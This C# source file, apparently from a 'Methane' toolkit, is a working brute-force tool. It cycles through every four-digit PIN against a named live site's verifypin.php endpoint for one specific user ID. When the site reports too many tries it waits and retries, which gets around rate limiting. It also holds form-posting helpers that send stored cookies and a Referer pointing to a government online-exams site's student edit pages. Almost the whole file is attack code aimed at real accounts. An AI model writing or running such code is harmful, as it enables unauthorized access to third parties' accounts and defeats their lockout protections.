using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using static Methane.Toolkit.Common;
using System.Text;
using HtmlAgilityPack;
using System.Net.Http;
using Methane.Toolkit;


namespace Methane.Toolkit
{
    public class BulkGETPOST
    {


        string cookie = "";
        readonly string bl = "";




        public void Run()
        {

            Log("");
            Log("    . . . . . . . . . . . . . . . .  .  ");
            Log("               Methane                  ");
            Log("         Bulk HTTP GET POST             ");
            Log("  Deigned for https://getlinks.info/love ");
            Log("    . . . . . . . . . . . . . . . .  .  ");
            Log("");




            cookie = "cookie.txt";
            try
            {
                cookie = File.ReadAllText(cookie);
            }
            catch (Exception ex)
            {
                LogError(ex, "Cannot read the Cookie file");
                //return;
                cookie = "no:cookie";
            }


            Log(GetForm("https://getlinks.info/love/verifypin.php?userid=sgafizb&pwd=1111"));


            for (int i = 0; i < 99; i++)
            {
                if (FoundPass)
                {
                    Log("Found it \n \n " + result);
                    return;
                }

                ThrURLPass(i * 100);
                //new System.Threading.Thread(new System.Threading.ParameterizedThreadStart(ThrURLPass)) { Name = i.ToString() }.Start(i * 100);
                runningThreads++;
            }

            while (runningThreads > 0)
            {
                System.Threading.Thread.Sleep(1000);
            }

        }

        private bool FoundPass = false;
        private string result;
        public int runningThreads = 0;
        public void ThrURLPass(object obj)
        {
            int passI = (int)obj;

            for (int i = passI; i < passI + 100; i++)
            {
                TryAgain:
                string pass = i.ToString("0000");
                //string resp = GetForm($@"https://getlinks.info/love/verifypin.php?userid=sgafizb&pwd={pass}");
                string resp = GetForm($@"https://getlinks.info/love/verifypin.php?userid=sgafizb&pwd={pass}");

                if (resp.Contains("Incorrect Password"))
                {
                    Log($"Pass {pass} is wrong");
                }
                else if (resp.Contains("Too Many Tries"))
                {

                    Log($"Too Many Tries {pass}");
                    //runningThreads--;
                    //return;
                    System.Threading.Thread.Sleep(1000);
                    goto TryAgain;
                }
                else
                {
                    string l = $"Positive response {pass} \n {resp} \n \n";
                    Log(l);
                    FoundPass = true;
                    result = l;
                    runningThreads--;
                    return;
                }
            }

            runningThreads--;
        }



        public string PostForm(string url, string poststring, string stdID)
        {
            var wr = WebRequest.CreateHttp(url);
            wr.Method = "POST";
            wr.ContentType = $"multipart/form-data; boundary={bl}";//"application /x-www-form-urlencoded";
            wr.Headers.Add("X-Requested-With", "XMLHttpRequest");
            wr.Headers.Add(HttpRequestHeader.Cookie, cookie);
            wr.Headers.Add(HttpRequestHeader.Referer, $"http://onlineexams.gov.lk/onlineapps/index.php/schoolapp/stuoapp/edit/{stdID}");


            wr.KeepAlive = true;

            byte[] bytedata = System.Text.Encoding.UTF8.GetBytes(poststring);
            wr.ContentLength = bytedata.Length;

            // Create the stream
            Stream requestStream = wr.GetRequestStream();
            requestStream.Write(bytedata, 0, bytedata.Length);
            requestStream.Close();

            // Get the response from remote server
            HttpWebResponse httpWebResponse = (HttpWebResponse)wr.GetResponse();
            Stream responseStream = httpWebResponse.GetResponseStream();

            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            using (StreamReader reader = new StreamReader(responseStream, System.Text.Encoding.UTF8))
            {
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    sb.AppendLine(line);
                }
            }

            string resp = sb.ToString();
            return resp;
        }



        public string PostFormMultipart(string url, MultipartFormDataContent form, string stdID)
        {
            var wr = WebRequest.CreateHttp(url);
            wr.Method = "POST";
            wr.ContentType = form.Headers.ContentType.ToString();// $"multipart/form-data; boundary={bl}";//"application /x-www-form-urlencoded";
            wr.Headers.Add("X-Requested-With", "XMLHttpRequest");
            wr.Headers.Add(HttpRequestHeader.Cookie, cookie);
            wr.Headers.Add(HttpRequestHeader.Referer, $"http://onlineexams.gov.lk/onlineapps/index.php/schoolapp/stuoapp/edit/{stdID}");


            wr.KeepAlive = true;

            byte[] bytedata = form.ReadAsByteArrayAsync().Result;
            wr.ContentLength = bytedata.Length;

            // Create the stream
            Stream requestStream = wr.GetRequestStream();
            requestStream.Write(bytedata, 0, bytedata.Length);
            requestStream.Close();


            // Get the response from remote server
            HttpWebResponse httpWebResponse = (HttpWebResponse)wr.GetResponse();
            Stream responseStream = httpWebResponse.GetResponseStream();

            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            using (StreamReader reader = new StreamReader(responseStream, System.Text.Encoding.UTF8))
            {
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    sb.AppendLine(line);
                }
            }

            string resp = sb.ToString();
            return resp;
        }




        public string GetForm(string url)
        {
            var wr = WebRequest.CreateHttp(url);
            wr.Method = "GET";
            wr.ContentType = "application/x-www-form-urlencoded";

            if (cookie.Length != 0) wr.Headers.Add(HttpRequestHeader.Cookie, cookie);


            // Get the response from remote server
            HttpWebResponse httpWebResponse = (HttpWebResponse)wr.GetResponse();
            Stream responseStream = httpWebResponse.GetResponseStream();

            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            using (StreamReader reader = new StreamReader(responseStream, System.Text.Encoding.UTF8))
            {
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    sb.AppendLine(line);
                }
            }

            return sb.ToString();
        }

        public static HtmlDocument GetFormDoc(string url, string cookie = "")
        {
            var wr = WebRequest.CreateHttp(url);
            wr.Method = "GET";
            // wr.ContentType = "multipart/form-data; boundary=---------------------------19609895721194";

            if (cookie.Length != 0) wr.Headers.Add(HttpRequestHeader.Cookie, cookie);


            // Get the response from remote server
            HttpWebResponse httpWebResponse = (HttpWebResponse)wr.GetResponse();
            Stream responseStream = httpWebResponse.GetResponseStream();

            HtmlDocument doc = new HtmlDocument();
            doc.Load(responseStream);

            return doc;
        }


    }

}

